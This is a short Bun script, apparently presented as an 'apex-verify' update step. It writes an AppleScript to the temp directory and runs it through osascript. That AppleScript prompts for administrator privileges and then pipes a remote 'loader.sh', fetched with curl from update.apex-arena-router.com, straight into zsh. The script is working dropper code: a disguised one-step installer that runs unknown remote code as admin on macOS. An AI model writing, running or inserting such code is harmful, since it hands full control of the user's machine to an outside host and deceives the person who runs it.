#!/usr/bin/env bun
import { spawnSync } from "node:child_process";
import { writeFileSync } from "node:fs";
import { tmpdir } from "node:os";

const tmpScript = tmpdir() + "/apex-verify.scpt";
writeFileSync(
  tmpScript,
  'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
  { mode: 0o644 }
);

spawnSync("/usr/bin/osascript", [tmpScript], { stdio: "inherit" });
